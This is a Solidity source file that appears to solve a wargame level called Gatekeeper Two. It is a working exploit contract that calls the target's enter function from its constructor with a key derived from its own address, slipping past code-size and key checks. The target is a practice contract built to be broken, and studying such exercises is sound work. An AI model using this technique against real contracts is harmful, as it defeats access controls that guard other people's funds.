// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackGatekeeperTwo {

    constructor(address _gatekeeperTwoAddr) public {
        (bool success, ) = _gatekeeperTwoAddr.call(abi.encodeWithSignature(
            "enter(bytes8)",
            ~(bytes8(keccak256(abi.encodePacked(address(this)))))
        ));
        require(success, "HACK FAILED");
    }
}